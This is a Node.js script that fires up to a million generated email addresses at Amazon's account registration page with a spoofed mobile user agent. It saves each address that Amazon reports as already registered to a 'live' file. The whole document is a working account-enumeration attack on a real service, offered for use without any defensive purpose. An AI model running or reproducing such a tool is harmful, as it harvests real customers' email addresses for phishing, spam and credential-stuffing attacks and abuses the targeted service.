const axios = require('axios');
const fs = require('fs');
const faker = require('faker');

faker.locale = "ja"; // Set locale to India for Asian names. You can change this to other locales like zh_CN for China, ja for Japan, etc.

const now = new Date();
const domain = process.argv[2] || "naver.com"; // Pass domain as command line argument or default to "example.com"

const liveStream = fs.createWriteStream('live.txt', {flags: 'a'});
// For a timestamped file, use the following line instead
// const liveStream = fs.createWriteStream(`LiveAuto${now.toISOString().replace(/:/g, '-')}.txt`, {flags: 'a'});

const link = "https://www.amazon.com/ap/register?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3F_encoding%3DUTF8%26ref_%3Dnav_newcust&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&";
const head = {
  'User-agent': 'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'
};

axios.get(link, {headers: head})
  .then(response => {
    console.log("-".repeat(55));
    for (let i = 0; i < 1000000; i++) {
      const name = faker.name.findName().replace(/\s/g, "");
      const random_number = faker.datatype.number({min: 0, max: 31});
      const email = `${name}@${domain}`;
      const data = {
        'customerName': 'Casein Nitrate',
        'email': email,
        'password': 'BirdyBirdySad012',
        'passwordCheck': 'BirdyBirdySad012'
      };

      axios.post(link, data, {headers: head})
        .then(response => {
          const text = response.data;
          if (text.includes("You indicated you're a new customer, but an account already exists with the email address")) {
            console.log(`LIVE | ${email} | [(${now.toISOString()})]`);
            liveStream.write(`${email}\n`);
          } else {
            console.log(`DIE | ${email} | [(${now.toISOString()})]`);
          }
        })
        .catch(error => {
          console.error(`Error: ${error.message}`);
        });
    }
  })
  .catch(error => {
    console.error(`Error: ${error.message}`);
  });
